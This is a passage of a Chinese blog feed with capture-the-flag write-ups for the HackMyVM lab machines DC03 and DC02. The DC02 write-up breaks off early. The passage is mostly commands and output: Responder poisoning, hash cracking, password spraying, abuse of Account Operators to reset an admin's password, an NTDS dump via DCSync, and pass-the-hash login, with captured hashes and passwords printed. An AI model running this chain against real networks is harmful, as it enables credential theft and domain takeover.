<br><a data-tooltip-position="top" aria-label="4.3. bloodhood分析域环境" data-href="#4.3. bloodhood分析域环境" href="https://www.c1trus.top/about:blank#4.3._bloodhood分析域环境" class="internal-link" target="_self" rel="noopener nofollow">4.3. bloodhood分析域环境</a>
<br><a data-tooltip-position="top" aria-label="4.4. 修改FBETH103用户密码" data-href="#4.4. 修改FBETH103用户密码" href="https://www.c1trus.top/about:blank#4.4._修改FBETH103用户密码" class="internal-link" target="_self" rel="noopener nofollow">4.4. 修改FBETH103用户密码</a>
<br><a data-tooltip-position="top" aria-label="4.5. DCSync" data-href="#4.5. DCSync" href="https://www.c1trus.top/about:blank#4.5._DCSync" class="internal-link" target="_self" rel="noopener nofollow">4.5. DCSync</a>


<br>靶机链接：https://hackmyvm.eu/machines/machine.php?vm=DC03
<br>作者：[josemlwdf](https://hackmyvm.eu/profile/?user=josemlwdf)
<br>难度：⭐️⭐️⭐️⭐️
<br>知识点：NTMLRelay、DCSync、AccountOperator组利用
<br><br>端口扫描<br>nmap -sC -sV 192.168.56.126 -p- -T4
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-11-21 02:01 CST
Stats: 0:01:59 elapsed; 0 hosts completed (1 up), 1 undergoing Service Scan
Service scan Timing: About 82.35% done; ETC: 02:03 (0:00:07 remaining)
Stats: 0:02:06 elapsed; 0 hosts completed (1 up), 1 undergoing Service Scan
Service scan Timing: About 82.35% done; ETC: 02:03 (0:00:08 remaining)
Nmap scan report for SOUPEDECODE.LOCAL (192.168.56.126)
Host is up (0.00020s latency).
Not shown: 65518 filtered tcp ports (no-response)
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2024-11-20 17:17:35Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: SOUPEDECODE.LOCAL0., Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn\_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: SOUPEDECODE.LOCAL0., Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|\_http-title: Not Found
|\_http-server-header: Microsoft-HTTPAPI/2.0
9389/tcp  open  mc-nmf        .NET Message Framing
49664/tcp open  msrpc         Microsoft Windows RPC
49668/tcp open  msrpc         Microsoft Windows RPC
49676/tcp open  ncacn\_http    Microsoft Windows RPC over HTTP 1.0
49689/tcp open  msrpc         Microsoft Windows RPC
MAC Address: 08:00:27:9E:B3:30 (Oracle VirtualBox virtual NIC)
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode:
|   3:1:1:
|\_    Message signing enabled and required
| smb2-time:
|   date: 2024-11-20T17:18:28
|\_  start\_date: N/A
|\_clock-skew: -45m31s
|\_nbstat: NetBIOS name: DC01, NetBIOS user: &lt;unknown&gt;, NetBIOS MAC: 08:00:27:9e:b3:30 (Oracle VirtualBox virtual NIC)
<br>fscan -h 192.168.56.126

   \_\_\_                              \_
  / \_ \     \_\_\_  \_\_\_ \_ \_\_ \_\_ \_  \_\_\_| | \_\_
 / /\_\/\_\_\_\_/ \_\_|/ \_\_| '\_\_/ \_ |/ \_\_| |/ /
/ /\_\\\_\_\_\_\_\\_\_ \ (\_\_| | | (\_| | (\_\_|   &lt;
\\_\_\_\_/     |\_\_\_/\\_\_\_|\_|  \\_\_,\_|\\_\_\_|\_|\\_\
                     fscan version: 1.8.4
start infoscan
192.168.56.126:88 open
192.168.56.126:445 open
192.168.56.126:139 open
192.168.56.126:135 open
[\*] alive ports len is: 4
start vulscan
[\*] NetBios 192.168.56.126  [+] DC:SOUPEDECODE\DC01
[\*] NetInfo
[\*]192.168.56.126
   [-&gt;]DC01
   [-&gt;]192.168.56.126
<br>域名 SOUPEDECODE
<br>配置/etc/hosts<br>192.168.56.126 SOUPEDECODE.LOCAL DC01.SOUPEDECODE.LOCAL
<br><br><br>先看下存不存在SMB匿名或来宾访问<br> smbmap -u anonymous -H SOUPEDECODE.LOCAL

    \_\_\_\_\_\_\_\_  \_\_\_      \_\_\_  \_\_\_\_\_\_\_   \_\_\_      \_\_\_       \_\_         \_\_\_\_\_\_\_
   /"       )|"  \    /"  ||   \_  "\ |"  \    /"  |     /""\       |   \_\_ "\
  (:   \\_\_\_/  \   \  //   |(. |\_)  :) \   \  //   |    /    \      (. |\_\_) :)
   \\_\_\_  \    /\  \/.    ||:     \/   /\   \/.    |   /' /\  \     |:  \_\_\_\_/
    \_\_/  \   |: \.        |(|  \_  \  |: \.        |  //  \_\_'  \    (|  /
   /" \   :) |.  \    /:  ||: |\_)  :)|.  \    /:  | /   /  \   \  /|\_\_/ \
  (\_\_\_\_\_\_\_/  |\_\_\_|\\_\_/|\_\_\_|(\_\_\_\_\_\_\_/ |\_\_\_|\\_\_/|\_\_\_|(\_\_\_/    \\_\_\_)(\_\_\_\_\_\_\_)
 -----------------------------------------------------------------------------
     SMBMap - Samba Share Enumerator | Shawn Evans - ShawnDEvans@gmail.com
                     https://github.com/ShawnDEvans/smbmap

[\*] Detected 1 hosts serving SMB
[\*] Established 0 SMB session(s)
<br>看来不存在<br><br>尝试利用字典通过Kerberos 身份验证枚举出域内存在的用户<br>kerbrute userenum -d SOUPEDECODE.LOCAL -t 100 --dc DC01.SOUPEDECODE.LOCAL /usr/share/wordlists/seclists/Usernames/xato-net-10-million-usernames.txt  -o valid\_user.txt

cat valid\_user.txt|grep @ |cut -d ' ' -f8 |cut -d '@' -f1 &gt; kerber\_brute\_users.txt

crackmapexec smb SOUPEDECODE.LOCAL -u valid\_usernames.txt -p kerber\_brute\_users.txt --no-bruteforce  --continue-on-success
<br>没能爆破出任何密码<br><br>因为我们的eth0网卡 与域控处于同一个网段，就可以使用 Responder 工具执行 LLMNR（本地链路多播名称解析） 或 NBT-NS（NetBIOS 名称服务） 中毒攻击<br>通过这种方式我们可以获取目标设备发送的 NetNTLMv2 哈希<br>过一会就能捕获到用户xkate578的NetNTLMv2哈希<br>responder -I eth0

[\*] [LLMNR]  Poisoned answer sent to fe80::1086:8b10:30e1:e48c for name FileServer
[\*] [MDNS] Poisoned answer sent to 192.168.56.126  for name FileServer.local
[\*] [MDNS] Poisoned answer sent to fe80::1086:8b10:30e1:e48c for name FileServer.local
[\*] [LLMNR]  Poisoned answer sent to fe80::1086:8b10:30e1:e48c for name FileServer
[\*] [MDNS] Poisoned answer sent to 192.168.56.126  for name FileServer.local
[\*] [LLMNR]  Poisoned answer sent to 192.168.56.126 for name FileServer
[\*] [MDNS] Poisoned answer sent to fe80::1086:8b10:30e1:e48c for name FileServer.local
[\*] [LLMNR]  Poisoned answer sent to 192.168.56.126 for name FileServer
[SMB] NTLMv2-SSP Client   : fe80::1086:8b10:30e1:e48c
[SMB] NTLMv2-SSP Username : soupedecode\xkate578
[SMB] NTLMv2-SSP Hash     : xkate578::soupedecode:d84ca885a743f75e:75ED58DEE93DAC74D07D69F87AF7CDE0:0101000000000000805CD77BC13BDB01FB4B96E42697CA710000000002000800490031003100330001001E00570049004E002D0044003000320037004A00580056004C004D004B00360004003400570049004E002D0044003000320037004A00580056004C004D004B0036002E0049003100310033002E004C004F00430041004C000300140049003100310033002E004C004F00430041004C000500140049003100310033002E004C004F00430041004C0007000800805CD77BC13BDB0106000400020000000800300030000000000000000000000000400000C3E24DD853B7CB217D974A2D7CD525FC353DB59CC32512BC98B2C70E1E620A600A0010000000000000000000000000000000000009001E0063006900660073002F00460069006C0065005300650072007600650072000000000000000000
<br><img alt="..." src="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/22.DC03.001.png" referrerpolicy="no-referrer"><br>使用hashcat破解这个hash<br>hashcat -a 0 -m 5600 hash /usr/share/wordlists/rockyou.txt
<br><img alt="..." src="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/22.DC03.002.png" referrerpolicy="no-referrer"><br>成功获取到密码是jesuschrist<br><br>现在我们获取到了用户与密码<br>xkate578：jesuschrist
<br><br>crackmapexec smb DC01.SOUPEDECODE.LOCAL -u 'xkate578' -p 'jesuschrist' --shares
SMB         SOUPEDECODE.LOCAL 445    DC01             [\*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:SOUPEDECODE.LOCAL) (signing:True) (SMBv1:False)
SMB         SOUPEDECODE.LOCAL 445    DC01             [+] SOUPEDECODE.LOCAL\xkate578:jesuschrist
SMB         SOUPEDECODE.LOCAL 445    DC01             [+] Enumerated shares
SMB         SOUPEDECODE.LOCAL 445    DC01             Share           Permissions     Remark
SMB         SOUPEDECODE.LOCAL 445    DC01             -----           -----------     ------
SMB         SOUPEDECODE.LOCAL 445    DC01             ADMIN$                          Remote Admin
SMB         SOUPEDECODE.LOCAL 445    DC01             C$                              Default share
SMB         SOUPEDECODE.LOCAL 445    DC01             IPC$            READ            Remote IPC
SMB         SOUPEDECODE.LOCAL 445    DC01             NETLOGON        READ            Logon server share
SMB         SOUPEDECODE.LOCAL 445    DC01             share           READ,WRITE
SMB         SOUPEDECODE.LOCAL 445    DC01             SYSVOL          READ            Logon server share
<br><br>smbclient -U 'xkate578' '//SOUPEDECODE.LOCAL/share'
Password for [WORKGROUP\xkate578]:
Try "help" to get a list of possible commands.
smb: \&gt; ls
  .                                  DR        0  Thu Nov 21 03:29:56 2024
  ..                                  D        0  Thu Aug  1 13:38:08 2024
  desktop.ini                       AHS      282  Thu Aug  1 13:38:08 2024
  user.txt                            A       70  Thu Aug  1 13:39:25 2024
<br>获取到我们的用户flag<br>┌──(root㉿kali)-[/home/kali/hmv/DC03]
└─# cat user.txt
▒▒12f54a96f64443246930da001cafda8b
<br><br>┌──(root㉿kali)-[/home/kali/hmv/DC03]
└─# dnschef --fakeip 192.168.56.126 &amp;
[1] 71209

┌──(root㉿kali)-[/home/kali/hmv/DC03]
└─#           \_                \_          \_\_
         | | version 0.4  | |        / \_|
       \_\_| |\_ \_\_  \_\_\_  \_\_\_| |\_\_   \_\_\_| |\_
      / \_ | '\_ \/ \_\_|/ \_\_| '\_ \ / \_ \  \_|
     | (\_| | | | \\_\_ \ (\_\_| | | |  \_\_/ |
      \\_\_,\_|\_| |\_|\_\_\_/\\_\_\_|\_| |\_|\\_\_\_|\_|
                   iphelix@thesprawl.org

(03:14:06) [\*] DNSChef started on interface: 127.0.0.1
(03:14:06) [\*] Using the following nameservers: 8.8.8.8
(03:14:06) [\*] Cooking all A replies to point to 192.168.56.126


┌──(root㉿kali)-[/home/kali/hmv/DC03]
└─#

┌──(root㉿kali)-[/home/kali/hmv/DC03]
└─# bloodhound-python  -u xkate578 -p jesuschrist -ns 127.0.0.1 -d SOUPEDECODE.LOCAL  -dc DC01.SOUPEDECODE.LOCAL --zip
INFO: Compressing output into 20241121031526\_bloodhound.zip
<br>导入压缩包里面的json文件进行分析<br><img alt="..." src="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/22.DC03.003.png" referrerpolicy="no-referrer"><br>发现这xkate578用户是Account Operator 组的成员，但当前用户在 AD 环境中创建和修改帐户的能力有限<br>Account Operators（账户操作员） 组为成员赋予了有限的账户创建权限。
<br>
该组的成员可以创建和修改大多数类型的账户，包括用户账户、本地组和全局组的账户。<br>
此外，组成员可以直接登录域控制器。Account Operators 组的成员不能管理以下内容：

<br>Administrator（管理员）用户账户。
<br>Administrators、Server Operators、Account Operators、Backup Operators 和 Print Operators 等<a class="internal-link" data-href="../渗透姿势库/默认受保护组.md" href="https://www.c1trus.top/24-渗透/渗透姿势库/默认受保护组.html" target="_self" rel="noopener nofollow">默认受保护组</a>。 
<br>Account Operators 组的成员也不能修改系统级别的用户权限（如登录本地、作为服务运行等）

<br>看一下到域管理的最近路径<br><img alt="..." src="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/22.DC03.004.png" referrerpolicy="no-referrer"><br>我们可以看到，用户 FBETH103 是 Operators 组的成员，而 Operators 组又是 Domain Admins（域管理员） 组的成员。由于 Operators 组并不是默认受保护组，<br>因此 Account Operators（账户操作员） 组的成员可以修改该组中成员的账户信息。<br>接下来，我们可以修改用户FBETH103 的密码。<br><br>┌──(root㉿kali)-[/home/kali/hmv/DC03]
└─# impacket-changepasswd SOUPEDECODE.LOCAL/fbeth103@192.168.56.14 -altuser xkate578 -altpass jesuschrist  -newpass admin123 -reset
Impacket v0.12.0.dev1 - Copyright 2023 Fortra

[\*] Setting the password of SOUPEDECODE.LOCAL\fbeth103 as SOUPEDECODE.LOCAL\xkate578
[\*] Connecting to DCE/RPC as SOUPEDECODE.LOCAL\xkate578
[\*] Password was changed successfully.
[!] User no longer has valid AES keys for Kerberos, until they change their password again.
<br>也可以用setuserinfo2 命令<br>┌──(root㉿kali)-[/home/kali/hmv/DC03]
└─# rpcclient -U 'xkate578' 192.168.56.14
Password for [WORKGROUP\xkate578]:
rpcclient $&gt; setuserinfo2 fbeth103 23 admin12345
rpcclient $&gt; exit

┌──(root㉿kali)-[/home/kali/hmv/DC03]
└─# crackmapexec smb DC01.SOUPEDECODE.LOCAL -u 'fbeth103' -p 'admin12345'
SMB         SOUPEDECODE.LOCAL 445    DC01             [\*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:SOUPEDECODE.LOCAL) (signing:True) (SMBv1:False)
SMB         SOUPEDECODE.LOCAL 445    DC01             [+] SOUPEDECODE.LOCAL\fbeth103:admin12345 (Pwn3d!)
<br>还可以用bloodyAD进行修改密码<br>┌──(root㉿kali)-[/home/kali/hmv/DC03]
└─# bloodyAD -d SOUPEDECODE.LOCAL --host 192.168.56.14 -u xkate578 -p jesuschrist set password FBETH103 admin321
[+] Password changed successfully!
<br><br>此时我们获取到了Operators 组下的用户FBETH103 ，而Operators 组又是Domain Admins（域管理员） 组的成员，那么我们就可以用这个用户对域控制器执行 DCSync 攻击。<br><img alt="..." src="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/22.DC03.005.png" referrerpolicy="no-referrer"><br>┌──(root㉿kali)-[/home/kali/hmv/DC03]
└─# crackmapexec smb DC01.SOUPEDECODE.LOCAL -u fbeth103 -p admin321 --ntds &gt;ntds.txt

┌──(root㉿kali)-[/home/kali/hmv/DC03]
└─# cat ntds.txt|grep Administrator
SMB         SOUPEDECODE.LOCAL 445    DC01             Administrator:500:aad3b435b51404eeaad3b435b51404ee:2176416a80e4f62804f101d3a55d6c93:::
<br>利用Administrator用户的NTLM hash 密码登录<br>┌──(root㉿kali)-[/home/kali/hmv/DC03]
└─# evil-winrm -i 192.168.56.14 -u Administrator -H 2176416a80e4f62804f101d3a55d6c93

Evil-WinRM shell v3.5

Warning: Remote path completions is disabled due to ruby limitation: quoting\_detection\_proc() function is unimplemented on this machine

Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

Info: Establishing connection to remote endpoint
\*Evil-WinRM\* PS C:\Users\Administrator\Documents&gt; type C:\Users\Administrator\Desktop\root.txt
b8e59a7d4020792c412da75e589ff4fc
]]></description><link>https://www.c1trus.top/24-渗透/hmv/22.dc03.html</link><guid isPermaLink="false">24-渗透/HMV/22.DC03.md</guid><dc:creator><![CDATA[C1trus]]></dc:creator><pubDate>Thu, 26 Dec 2024 06:21:46 GMT</pubDate><enclosure url="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/22.DC03.001.png" length="0" type="image/png"/><content:encoded>&lt;figure&gt;&lt;img src="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/22.DC03.001.png"&gt;&lt;/figure&gt;</content:encoded></item><item><title><![CDATA[21.DC02]]></title><description><![CDATA[ 
 <br><br>
<br><a data-tooltip-position="top" aria-label="1. 基本信息^toc" data-href="#1. 基本信息^toc" href="https://www.c1trus.top/about:blank#1._基本信息^toc" class="internal-link" target="_self" rel="noopener nofollow">1. 基本信息</a>
<br><a data-tooltip-position="top" aria-label="2. 信息收集" data-href="#2. 信息收集" href="https://www.c1trus.top/about:blank#2._信息收集" class="internal-link" target="_self" rel="noopener nofollow">2. 信息收集</a>

<br><a data-tooltip-position="top" aria-label="2.1. 端口扫描" data-href="#2.1. 端口扫描" href="https://www.c1trus.top/about:blank#2.1._端口扫描" class="internal-link" target="_self" rel="noopener nofollow">2.1. 端口扫描</a>
<br><a data-tooltip-position="top" aria-label="2.2. SMB空会话检测" data-href="#2.2. SMB空会话检测" href="https://www.c1trus.top/about:blank#2.2._SMB空会话检测" class="internal-link" target="_self" rel="noopener nofollow">2.2. SMB空会话检测</a>


<br><a data-tooltip-position="top" aria-label="3. kerbrute 爆破" data-href="#3. kerbrute 爆破" href="https://www.c1trus.top/about:blank#3._kerbrute_爆破" class="internal-link" target="_self" rel="noopener nofollow">3. kerbrute 爆破</a>

<br><a data-tooltip-position="top" aria-label="3.1. 密码喷涂" data-href="#3.1. 密码喷涂" href="https://www.c1trus.top/about:blank#3.1._密码喷涂" class="internal-link" target="_self" rel="noopener nofollow">3.1. 密码喷涂</a>


<br><a data-tooltip-position="top" aria-label="4. ASREPRoasting" data-href="#4. ASREPRoasting" href="https://www.c1trus.top/about:blank#4._ASREPRoasting" class="internal-link" target="_self" rel="noopener nofollow">4. ASREPRoasting</a>

<br><a data-tooltip-position="top" aria-label="4.1. 相对标识符（RID）暴力枚举出域内的其他用户" data-href="#4.1. 相对标识符（RID）暴力枚举出域内的其他用户" href="https://www.c1trus.top/about:blank#4.1._相对标识符（RID）暴力枚举出域内的其他用户" class="internal-link" target="_self" rel="noopener nofollow">4.1. 相对标识符（RID）暴力枚举出域内的其他用户</a>
<br><a data-tooltip-position="top" aria-label="4.2. 枚举禁用了 Kerberos 预认证的用户" data-href="#4.2. 枚举禁用了 Kerberos 预认证的用户" href="https://www.c1trus.top/about:blank#4.2._枚举禁用了_Kerberos_预认证的用户" class="internal-link" target="_self" rel="noopener nofollow">4.2. 枚举禁用了 Kerberos 预认证的用户</a>
<br><a data-tooltip-position="top" aria-label="4.3. 暴力破解AS-REP响应密码hash" data-href="#4.3. 暴力破解AS-REP响应密码hash" href="https://www.c1trus.top/about:blank#4.3._暴力破解AS-REP响应密码hash" class="internal-link" target="_self" rel="noopener nofollow">4.3. 暴力破解AS-REP响应密码hash</a>


<br><a data-tooltip-position="top" aria-label="5. Bloodhound收集域内信息" data-href="#5. Bloodhound收集域内信息" href="https://www.c1trus.top/about:blank#5._Bloodhound收集域内信息" class="internal-link" target="_self" rel="noopener nofollow">5. Bloodhound收集域内信息</a>
<br><a data-tooltip-position="top" aria-label="6. SAM转储" data-href="#6. SAM转储" href="https://www.c1trus.top/about:blank#6._SAM转储" class="internal-link" target="_self" rel="noopener nofollow">6. SAM转储</a>

<br><a data-tooltip-position="top" aria-label="6.1. 利用机器hash进行密码喷射" data-href="#6.1. 利用机器hash进行密码喷射" href="https://www.c1trus.top/about:blank#6.1._利用机器hash进行密码喷射" class="internal-link" target="_self" rel="noopener nofollow">6.1. 利用机器hash进行密码喷射</a>


<br><a data-tooltip-position="top" aria-label="7. DCSync攻击" data-href="#7. DCSync攻击" href="https://www.c1trus.top/about:blank#7._DCSync攻击" class="internal-link" target="_self" rel="noopener nofollow">7. DCSync攻击</a>

<br><a data-tooltip-position="top" aria-label="7.1. winrm登录" data-href="#7.1. winrm登录" href="https://www.c1trus.top/about:blank#7.1._winrm登录" class="internal-link" target="_self" rel="noopener nofollow">7.1. winrm登录</a>


<br>靶机链接：https://hackmyvm.eu/machines/machine.php?vm=DC02
<br>作者：[josemlwdf](https://hackmyvm.eu/profile/?user=josemlwdf)
<br>难度：⭐️⭐️⭐️⭐️
<br>知识点：ASREPRoasting、Bloodhound分析、SAM转储、DCSync 、kerbrute 爆破
<br><br><br>nmap -sC -sV 192.168.56.126 -p- -T4
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-11-20 11:36 CST
Stats: 0:02:17 elapsed; 0 hosts completed (1 up), 1 undergoing Service Scan
Service scan Timing: About 77.78% done; ETC: 11:39 (0:00:14 remaining)
Stats: 0:02:22 elapsed; 0 hosts completed (1 up), 1 undergoing Service Scan
Service scan Timing: About 77.78% done; ETC: 11:39 (0:00:15 remaining)
Nmap scan report for 192.168.56.126
Host is up (0.00022s latency).
Not shown: 65517 filtered tcp ports (no-response)
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2024-11-20 02:57:08Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: SOUPEDECODE.LOCAL0., Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn\_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: SOUPEDECODE.LOCAL0., Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|\_http-server-header: Microsoft-HTTPAPI/2.0
|\_http-title: Not Found
9389/tcp  open  mc-nmf        .NET Message Framing
49664/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
49674/tcp open  ncacn\_http    Microsoft Windows RPC over HTTP 1.0
49687/tcp open  msrpc         Microsoft Windows RPC
49707/tcp open  msrpc         Microsoft Windows RPC
MAC Address: 08:00:27:F5:A3:8F (Oracle VirtualBox virtual NIC)
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode:
|   3:1:1:
|\_    Message signing enabled and required
|\_nbstat: NetBIOS name: DC01, NetBIOS user: &lt;unknown&gt;, NetBIOS MAC: 08:00:27:f5:a3:8f (Oracle VirtualBox virtual NIC)
|\_clock-skew: -40m50s
| smb2-time:
|   date: 2024-11-20T02:58:01
|\_  start\_date: N/A
<br>192.168.56.126:389 open
192.168.56.126:53 open
192.168.56.126:135 open
192.168.56.126:445 open
192.168.56.126:464 open
192.168.56.126:88 open
192.168.56.126:593 open
192.168.56.126:636 open
192.168.56.126:139 open
192.168.56.126:3268 open
192.168.56.126:3269 open
192.168.56.126:5985 open
192.168.56.126:9389 open
192.168.56.126:49667 open
192.168.56.126:49664 open
192.168.56.126:49674 open
192.168.56.126:49687 open
192.168.56.126:49707 open
[\*] alive ports len is: 18
start vulscan
[\*] NetBios 192.168.56.126  [+] DC:SOUPEDECODE\DC01
[\*] WebTitle http://192.168.56.126:5985 code:404 len:315    title:Not Found
[\*] NetInfo
[\*]192.168.56.126
   [-&gt;]DC01
   [-&gt;]192.168.56.126
<br>域名 SOUPEDECODE
<br>先配置hosts<br>vim /etc/hosts
192.168.56.126 SOUPEDECODE.LOCAL DC01.SOUPEDECODE.LOCAL
<br><br>目标开放了 139 445端口<br>smbmap 检测一下是否存匿名登录与来宾登录<br>─# smbmap -u anonymous -H SOUPEDECODE.LOCAL

    \_\_\_\_\_\_\_\_  \_\_\_      \_\_\_  \_\_\_\_\_\_\_   \_\_\_      \_\_\_       \_\_         \_\_\_\_\_\_\_
   /"       )|"  \    /"  ||   \_  "\ |"  \    /"  |     /""\       |   \_\_ "\
  (:   \\_\_\_/  \   \  //   |(. |\_)  :) \   \  //   |    /    \      (. |\_\_) :)
   \\_\_\_  \    /\  \/.    ||:     \/   /\   \/.    |   /' /\  \     |:  \_\_\_\_/
    \_\_/  \   |: \.        |(|  \_  \  |: \.        |  //  \_\_'  \    (|  /
   /" \   :) |.  \    /:  ||: |\_)  :)|.  \    /:  | /   /  \   \  /|\_\_/ \
  (\_\_\_\_\_\_\_/  |\_\_\_|\\_\_/|\_\_\_|(\_\_\_\_\_\_\_/ |\_\_\_|\\_\_/|\_\_\_|(\_\_\_/    \\_\_\_)(\_\_\_\_\_\_\_)
 -----------------------------------------------------------------------------
     SMBMap - Samba Share Enumerator | Shawn Evans - ShawnDEvans@gmail.com
                     https://github.com/ShawnDEvans/smbmap

[\*] Detected 1 hosts serving SMB
[\*] Established 0 SMB session(s)
<br>发现目标并没有开启SMB 空会话 与LDAP匿名登录<br><br>我们利用常见用户名作为字典 对Kerberos 身份验证来枚举域中可能存在的用户。<br>kerbrute userenum -d SOUPEDECODE.LOCAL -t 50 --dc DC01.SOUPEDECODE.LOCAL /usr/share/wordlists/seclists/Usernames/xato-net-10-million-usernames.txt -o valid\_user.txt

    \_\_             \_\_               \_\_
   / /\_\_\_\_\_  \_\_\_\_\_/ /\_  \_\_\_\_\_\_\_  \_\_/ /\_\_\_\_
  / //\_/ \_ \/ \_\_\_/ \_\_ \/ \_\_\_/ / / / \_\_/ \_ \
 / ,&lt; /  \_\_/ /  / /\_/ / /  / /\_/ / /\_/  \_\_/
/\_/|\_|\\_\_\_/\_/  /\_.\_\_\_/\_/   \\_\_,\_/\\_\_/\\_\_\_/

Version: v1.0.3 (9dad6e1) - 11/20/24 - Ronnie Flathers @ropnop

2024/11/20 12:10:37 &gt;  Using KDC(s):
2024/11/20 12:10:37 &gt;   DC01.SOUPEDECODE.LOCAL:88

2024/11/20 12:10:37 &gt;  [+] VALID USERNAME:       admin@SOUPEDECODE.LOCAL
2024/11/20 12:10:37 &gt;  [+] VALID USERNAME:       charlie@SOUPEDECODE.LOCAL
2024/11/20 12:10:38 &gt;  [+] VALID USERNAME:       Charlie@SOUPEDECODE.LOCAL
2024/11/20 12:10:38 &gt;  [+] VALID USERNAME:       administrator@SOUPEDECODE.LOCAL
2024/11/20 12:10:38 &gt;  [+] VALID USERNAME:       Admin@SOUPEDECODE.LOCAL
2024/11/20 12:10:38 &gt;  [+] VALID USERNAME:       Administrator@SOUPEDECODE.LOCAL
2024/11/20 12:10:38 &gt;  [+] VALID USERNAME:       CHARLIE@SOUPEDECODE.LOCAL
2024/11/20 12:10:40 &gt;  [+] VALID USERNAME:       ADMIN@SOUPEDECODE.LOCAL
2024/11/20 12:11:04 &gt;  [+] VALID USERNAME:       wreed11@SOUPEDECODE.LOCAL
2024/11/20 12:12:02 &gt;  [+] VALID USERNAME:       printserver@SOUPEDECODE.LOCAL
2024/11/20 12:12:57 &gt;  [+] VALID USERNAME:       kleo2@SOUPEDECODE.LOCAL
2024/11/20 12:14:00 &gt;  [+] VALID USERNAME:       dc01@SOUPEDECODE.LOCAL
2024/11/20 12:14:46 &gt;  [+] VALID USERNAME:       aDmin@SOUPEDECODE.LOCAL
2024/11/20 12:15:08 &gt;  [+] VALID USERNAME:       ChArLiE@SOUPEDECODE.LOCAL
2024/11/20 12:15:09 &gt;  [+] VALID USERNAME:       CHarlie@SOUPEDECODE.LOCAL
2024/11/20 12:15:20 &gt;  Done! Tested 8295455 usernames (15 valid) in 282.207 seconds
<br>-d 域名<br>
-t 线程<br>
--dc DC-o 输出到文件<br>提取一下用户名<br>//提取出用户名 并全部转为小写
cat valid\_user.txt | grep @ | cut -d " " -f8 | cut -d '@' -f1 | while read a; do echo "$a" | tr '[:upper:]' '[:lower:]' &gt;&gt; valid\_user\_lowercase.txt; done
//去重
cat valid\_user\_lowercase.txt  | sort -u &gt; valid\_usernames.txt
<br><br>获取到了用户名单valid_usernames.txt<br>尝试利用用户名作为密码进行密码喷涂<br>--no-bruteforce 禁用暴力破解尝试<br>--continue-on-success 在成功验证某个用户名和密码后，程序继续运行，不会因为一个成功的验证就停止所有后续操作<br>crackmapexec smb SOUPEDECODE.LOCAL -u valid\_usernames.txt -p valid\_usernames.txt --no-bruteforce  --continue-on-success
SMB         SOUPEDECODE.LOCAL 445    DC01             [\*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:SOUPEDECODE.LOCAL) (signing:True) (SMBv1:False)
SMB         SOUPEDECODE.LOCAL 445    DC01             [-] SOUPEDECODE.LOCAL\admin:admin STATUS\_LOGON\_FAILURE
SMB         SOUPEDECODE.LOCAL 445    DC01             [-] SOUPEDECODE.LOCAL\administrator:administrator STATUS\_LOGON\_FAILURE
SMB         SOUPEDECODE.LOCAL 445    DC01             [+] SOUPEDECODE.LOCAL\charlie:charlie
SMB         SOUPEDECODE.LOCAL 445    DC01             [-] SOUPEDECODE.LOCAL\dc01:dc01 STATUS\_LOGON\_FAILURE
SMB         SOUPEDECODE.LOCAL 445    DC01             [-] SOUPEDECODE.LOCAL\kleo2:kleo2 STATUS\_LOGON\_FAILURE
SMB         SOUPEDECODE.LOCAL 445    DC01             [-] SOUPEDECODE.LOCAL\printserver:printserver STATUS\_LOGON\_FAILURE
SMB         SOUPEDECODE.LOCAL 445    DC01             [-] SOUPEDECODE.LOCAL\wreed11:wreed11 STATUS\_LOGON\_FAILURE
<br>成功获取到了一个用户的密码<br>charlie:charlie
<br><br><br>crackmapexec smb SOUPEDECODE.LOCAL -u 'charlie' -p 'charlie' --rid-brute &gt; rid\_bruteforce.txt

cat rid\_bruteforce | grep  'SidTypeUser' | cut -d '\' -f2 | cut -d ' ' -f1  &gt; domain\_users.txt
<br><img alt="..." src="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/21.DC02.001.png" referrerpolicy="no-referrer"><br><br>利用impacket-GetNPUsers 枚举禁用 Kerberos 预认证的用户以获取可以用于 ASREPRoasting 攻击的用户<br>
禁用预认证的用户会向域控制器发送不包含加密的身份验证请求，因此攻击者可以捕获 AS-REP 响应并进行密码破解。
